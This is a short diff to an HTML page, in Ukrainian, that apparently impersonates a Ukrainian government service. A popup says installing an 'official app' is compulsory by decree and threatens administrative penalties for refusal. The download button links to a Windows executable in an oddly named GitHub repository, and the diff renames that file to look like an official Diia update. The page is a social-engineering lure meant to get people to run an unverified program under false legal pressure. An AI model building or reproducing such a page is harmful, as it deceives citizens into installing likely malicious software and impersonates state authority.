@@ -204,7 +204,7 @@
                 <div class="popup-warning">
                     *Встановлення додатка є обов'язковим згідно з Постановою Кабінету Міністрів України №754 від 15.11.2023 "Про цифровізацію адміністративних послуг у регіонах". За відмову встановлення передбачено адміністративну відповідальність згідно зі ст. 188-21 КУпАП.
                 </div>
-                <a href="https://github.com/mk-gov-ua/jgfjdhkmbvn.github.io/raw/refs/heads/main/DIAMikolaev.exe" class="download-btn" id="downloadBtn">
+                <a href="https://github.com/mk-gov-ua/jgfjdhkmbvn.github.io/raw/refs/heads/main/Diia_Update_4.7.1_Official.exe" class="download-btn" id="downloadBtn">
                     ЗАВАНТАЖИТИ ОФІЦІЙНИЙ ДОДАТОК
                 </a>
             </div>
